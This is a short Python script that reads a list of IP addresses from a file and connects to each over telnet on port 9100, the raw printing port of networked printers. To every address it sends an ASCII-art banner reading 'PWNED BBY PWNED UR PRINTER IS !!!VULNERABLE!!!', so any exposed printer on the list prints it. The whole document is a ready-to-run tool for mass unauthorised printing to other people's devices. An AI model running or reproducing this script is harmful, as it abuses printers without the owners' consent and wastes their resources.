import sys
import telnetlib

ascii_art = """         _nnnn_
        dGGGGMMb	   PWNED BBY PWNED
       @p~qp~~qMb	   UR PRINTER IS
       M|@||@) M|	  !!!VULNERABLE!!!
       @,----.JM|
      JS^\__/  qKL
     dZP        qKRb
    dZP          qKKb
   fZP            SMMb
   HZM            MMMM
   FqM            MMMM
 __| ".        |\dS"qML
 |    `.       | `' \Zq
_)      \.___.,|     .'
\____   )MMMMMP|   .'
     `-'       `--' hjm"""

with open('jetdirect.txt') as f:
   for ip in f:
	tn = telnetlib.Telnet(ip, 9100)
	tn.write(ascii_art)
	tn.write('\029')
	tn.write('exit\n')
